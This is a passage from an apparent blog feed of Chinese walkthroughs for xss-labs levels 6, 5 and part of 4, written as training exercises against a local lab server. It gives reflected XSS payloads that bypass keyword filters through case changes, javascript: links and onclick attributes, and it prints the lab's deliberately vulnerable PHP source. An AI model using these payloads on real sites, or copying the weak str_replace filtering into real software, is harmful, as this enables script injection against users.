punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/oNclink+sRc+daTa+hRef/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level6/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>标签中参数的尖括号进行了转义，而对<code>name=keyword</code>的<code>input</code>标签中的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行了转换，使用关键字的大写就可以正常弹窗，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level6<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token string">">&lt;a Href="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span>"<span class="token operator">></span>click me<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level6/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level7.php?keyword=move up!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level6<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level6<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level6.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str6.<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>搜索</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level6.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由23行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17-22、25行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的<code>&lt;script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行转义后赋值给<code>name=keyword</code>的<code>input</code>标签的<code>value</code>值。</li></ul></li><li><p>所以含有的<code>&lt;script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>的注入无效，但其大写字母构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序对参数中含有的<code>&lt;script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行转义后才将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># 小大写绕过<span class="token string">">&lt;a Href="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span>"<span class="token operator">></span>click me<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level5</title>
      <link href="/2020/10/26/xss-zhi-xss-labs-level5/"/>
      <url>/2020/10/26/xss-zhi-xss-labs-level5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该网页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level5/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level5<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level5<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">Alert</span><span class="token punctuation">(</span><span class="token regex">/oNclink/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level5/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>标签中参数的尖括号进行了转义，而对<code>name=keyword</code>的<code>input</code>标签中的<code>script</code>和<code>on</code>进行了转换，构造不含有这两个关键字的payload就可以正常弹窗，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level5<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token string">">&lt;a href="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span>"<span class="token operator">></span>click me<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level5/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level6.php?keyword=break it out!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level5<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level5<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level5.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str3.<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>搜索</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level5.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre></li></ol><pre><code>   - 由20行代码可知：GET方法得到的参数经过`htmlspecialchars()`函数转义后回显到HTML页面中。   - 由17-22行代码可知：程序将通过**GET方法**得到的参数进行小写转换并且对`&lt;script`和`on`进行转换后赋值给`name=keyword`的`input`标签的`value`值。4. 所以含有的`&lt;script`和`on`的注入无效，但其他XSS仍可以使用。# 0x05 实验分析- 程序仅对两个指定的关键字进行转义后就将参数回显到HTML页面中，所以此关的payload非常多：  ```javascript  # 伪协议  &quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;  ...</code></pre><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level4</title>
      <link href="/2020/10/26/xss-zhi-xss-labs-level4/"/>
      <url>/2020/10/26/xss-zhi-xss-labs-level4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该网页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level4/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level4<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level4/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>标签中参数的尖括号进行了转义，而对<code>name=keyword</code>的<code>input</code>标签中的<strong>尖括号</strong>进行了过滤，构造不含尖括号的触发事件就可以正常弹窗，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level4<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token string">"+onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level4/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level5.php?keyword=find a way out!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level4<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level4<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span 